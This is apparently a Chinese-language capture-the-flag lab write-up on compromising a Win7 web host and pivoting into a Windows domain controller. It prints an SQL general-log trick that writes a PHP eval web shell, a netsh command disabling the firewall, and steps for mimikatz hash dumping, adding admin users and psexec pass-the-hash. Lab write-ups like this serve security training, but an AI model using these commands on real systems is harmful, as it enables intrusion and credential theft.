## win7

首先主机发现

![image-20200618150218777](wp-photo/image-20200618150218777.png)

确定了靶机的ip：172.20.10.151

直接访问，确定就是这个ip了

![image-20200618150306095](wp-photo/image-20200618150306095.png)

扫一下路径，有phpmyadmin

![image-20200618150515613](wp-photo/image-20200618150515613.png)

进去是phpMyadmin登录界面，随手来一个弱口令root root，成功登录

![image-20200618151133415](wp-photo/image-20200618151133415.png)

然后就是用phpMyadmin的洞去getshell，常见的是into outfile导出木马，正好给了phpinfo，有绝对路径，尝试一波

![image-20200618151348051](wp-photo/image-20200618151348051.png)

报错，说明这个限制了写文件

![image-20200618151451783](wp-photo/image-20200618151451783.png)

尝试记录日志去getshell

```
SET GLOBAL general_log='on'
SET GLOBAL general_log_file='C:/phpStudy/WWW/shell.php'
SELECT '<?php eval($_POST["cmd"]);?>'
```

成功写入

![image-20200618152131490](wp-photo/image-20200618152131490.png)

然后蚁剑链接，成功getshell

![image-20200618152242657](wp-photo/image-20200618152242657.png)

随便翻翻，找到了第一个flag

![image-20200618154937704](wp-photo/image-20200618154937704.png)

然后上msf的马，准备内网渗透

![image-20200618153322320](wp-photo/image-20200618153322320.png)

是64位系统，找个系统进程切过去

![image-20200618170913083](wp-photo/image-20200618170913083.png)

![image-20200618170100068](wp-photo/image-20200618170100068.png)

查看一下权限，已经是system权限了，直接load mimikatz

![image-20200618170227092](wp-photo/image-20200618170227092.png)

查看密码，嗯，应该是没恢复镜像的锅，抓不到明文密码，只能抓到hash

![image-20200618171135461](wp-photo/image-20200618171135461.png)

新建一个用户吧，然后加到administrator里

![image-20200618172126041](wp-photo/image-20200618172126041.png)

尝试登录3389，连接失败，关一下防火墙

```
netsh advfirewall set allprofiles state off
```

然后再测试3389是否通，发现通了

```
netstat -ano | find "3389"
```

![image-20200618172339729](wp-photo/image-20200618172339729.png)

rdesktop 连一下，输入账号密码就可以成功进去了

![image-20200618172801411](wp-photo/image-20200618172801411.png)

到此第一个win7应该是结束了

## 内网渗透

看一下域，有一个GOD域

![image-20200618155744625](wp-photo/image-20200618155744625.png)

添加路由，然后扫网段

![image-20200618161951680](wp-photo/image-20200618161951680.png)

跳板机的ip是192.168.52.143，剩下两个的ip 192.168.52.138 和 192.168.52.141 应该是内网机器的了

先上个代理

![image-20200618174058420](wp-photo/image-20200618174058420.png)

改一下proxychains，文件路径/etc/proxychains.conf

![image-20200618174231356](wp-photo/image-20200618174231356.png)

nmap开扫，没扫出来，nmap关闭（后来发现socks4a就没挂上hhh

试一下msf自己的扫描，扫出来一些端口

![image-20200618181344850](wp-photo/image-20200618181344850.png)

同理扫描192.168.52.138，发现也开放了445端口

经过漫长的尝试，发现这个可以打138的机器，直接传递hash（参考https://xz.aliyun.com/t/6600

```
exploit/windows/smb/psexec
```

配置好各种参数，如下

![image-20200618205706420](wp-photo/image-20200618205706420.png)

运行，成功获取shell

![image-20200618205745800](wp-photo/image-20200618205745800.png)

开启远程桌面

![image-20200618210047661](wp-photo/image-20200618210047661.png)

抓hash

![image-20200618210300469](wp-photo/image-20200618210300469.png)

使用smart_hash，可以抓到域内全部hash，应该是域控了

![image-20200618210738851](wp-photo/image-20200618210738851.png)

然后先找一下flag，在C:\Users\administrator\Desktop\flag3.png，下载

![image-20200618212143824](wp-photo/image-20200618212143824.png)

查看一下，嗯，果然是域控

![image-20200618212215515](wp-photo/image-20200618212215515.png)

挂一下代理，这里使用ew，主机

![image-20200618223738092](wp-photo/image-20200618223738092.png)

登录远程桌面，由于挂代理会比较慢，等一会就好了

![image-20200618223839494](wp-photo/image-20200618223839494.png)

然后去看剩下的域内主机，同样的操作，就很简单了

![image-20200618225438608](wp-photo/image-20200618225438608.png)

看一下flag，漫长的寻找，在C:\Documents and Settings\Administrator.GOD\Desktop\flag2.png里

![image-20200618231215772](wp-photo/image-20200618231215772.png)

添加用户，远程连接，这都常规操作了（这里懒了登录的实体机hhh

![image-20200618230626608](wp-photo/image-20200618230626608.png)

